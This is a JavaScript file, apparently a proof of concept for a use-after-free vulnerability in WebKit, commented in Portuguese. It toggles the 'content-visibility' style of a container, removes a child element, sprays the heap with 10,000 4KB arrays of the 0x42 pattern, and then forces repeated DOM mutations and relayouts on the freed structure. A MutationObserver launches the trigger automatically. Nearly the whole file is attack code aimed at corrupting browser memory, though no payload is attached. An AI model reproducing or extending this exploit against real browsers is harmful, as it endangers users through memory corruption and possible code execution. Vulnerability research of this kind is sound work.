// js/uaf_webkit_poc/poc.js
import { debug_log } from './module/utils.mjs';

let uafCoreLogicHasRun = false; // Flag para controlar a execução da lógica principal

function heapSpray() {
  let spray = [];
  const sprayIterations = 10000; // Mantendo 10000 iterações
  
  // NOVO: Pulverizar com o padrão QWORD 0x4242424242424242
  const sprayPatternQWORD = [0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42, 0x42]; 
  
  debug_log(`Iniciando heapSpray AGRESSIVO com ${sprayIterations} iterações e padrão QWORD [0x42...]...`);

  for (let i = 0; i < sprayIterations; i++) {
    let arr = new Uint8Array(0x1000); // 4KB
    for (let j = 0; j < arr.length; j++) {
      arr[j] = sprayPatternQWORD[j % sprayPatternQWORD.length]; // Aplica o padrão QWORD
    }
    spray.push(arr);
  }
  return spray;
}

export function triggerUAF() {
  const currentContainer = document.querySelector(".container");

  if (!currentContainer) {
    debug_log("Erro Crítico: Elemento .container não encontrado para UAF.");
    console.error("Erro Crítico: Elemento .container não encontrado para UAF.");
    return;
  }

  // A lógica principal do UAF só roda uma vez por carregamento de página
  if (uafCoreLogicHasRun && document.getElementById('runUAFBtn') && document.getElementById('runUAFBtn').disabled) {
    debug_log("UAF já foi tentado (botão desabilitado). Recarregue a página para um novo teste completo.");
    return;
  }

  const currentChild = currentContainer.querySelector(".child");

  debug_log("Iniciando tentativa de UAF AGRESSIVO: contentVisibility=hidden...");
  currentContainer.style.contentVisibility = "hidden";

  if (currentChild) {
    debug_log("Elemento .child encontrado, removendo-o.");
    currentChild.remove();
  } else {
    debug_log("Elemento .child já foi removido ou não encontrado inicialmente.");
  }

  uafCoreLogicHasRun = true; 
  const uafButton = document.getElementById('runUAFBtn');
  if(uafButton) {
      uafButton.disabled = true;
      debug_log("Botão de UAF desabilitado. Recarregue a página para um novo teste completo.");
  }

  setTimeout(() => {
    debug_log("Continuando UAF AGRESSIVO: contentVisibility=auto, heapSpray()...");
    if (document.body.contains(currentContainer)) {
        currentContainer.style.contentVisibility = "auto";
    } else {
        debug_log("Container foi removido do DOM antes de contentVisibility='auto'.");
        return;
    }
    
    let sprayArrays = heapSpray(); 
    if(sprayArrays.length > 0) {
        debug_log(`Heap spray AGRESSIVO realizado com ${sprayArrays.length} arrays (padrão QWORD [0x42...]).`);
    }
    debug_log("Tentativa de UAF AGRESSIVO (principal) concluída. Verifique o console e comportamento do navegador.");

    // Manipulações de DOM ADICIONAIS E AGRESSIVAS após o UAF
    if (document.body.contains(currentContainer)) {
        debug_log("Forçando interações adicionais AGRESSIVAS no container pós-UAF...");
        try {
            currentContainer.style.backgroundColor = "#FF0000"; // Mudar cor de fundo
            void currentContainer.offsetHeight; // Forçar re-layout

            let tempChild = document.createElement('div');
            tempChild.style.width = "50px";
            tempChild.style.height = "50px";
            tempChild.style.background = "lime";
            tempChild.textContent = "New";
            currentContainer.appendChild(tempChild); // Adicionar novo filho
            void currentContainer.offsetHeight; // Forçar re-layout

            currentContainer.removeChild(tempChild); // Remover filho
            void currentContainer.offsetHeight; // Forçar re-layout

            currentContainer.innerHTML += "<span>Texto Adicionado Pós-UAF</span>"; // Modificar innerHTML
            void currentContainer.offsetHeight; // Forçar re-layout

            currentContainer.style.transform = "scale(1.1)"; // Aplicar transformação
            void currentContainer.offsetHeight; // Forçar re-layout
            currentContainer.style.transform = "scale(1.0)";


            debug_log("Interações adicionais AGRESSIVAS no container concluídas.");
        } catch(e) {
            debug_log(`Erro durante interações agressivas no DOM: ${e.name} - ${e.message}`);
            console.error("Erro DOM agressivo:", e);
        }
    } else {
        debug_log("Container não está mais no DOM para interações agressivas.");
    }

  }, 0);
}

// Configuração do MutationObserver (continua one-shot para a lógica principal)
const initialContainerForObserver = document.querySelector(".container");
if (initialContainerForObserver) {
    const observer = new MutationObserver((mutationsList, obs) => {
      if (!uafCoreLogicHasRun) { 
        debug_log("MutationObserver: DOM tree modified, chamando triggerUAF (primeira vez via observer)...");
        triggerUAF();
        obs.disconnect(); 
        debug_log("MutationObserver desconectado.");
      } else {
        // Se a lógica principal já rodou, desconectamos o observer para evitar mais chamadas.
        obs.disconnect(); 
      }
    });
    observer.observe(initialContainerForObserver, { childList: true, subtree: true });
} else {
    console.warn("Elemento .container inicial não encontrado para MutationObserver no UAF PoC.");
}
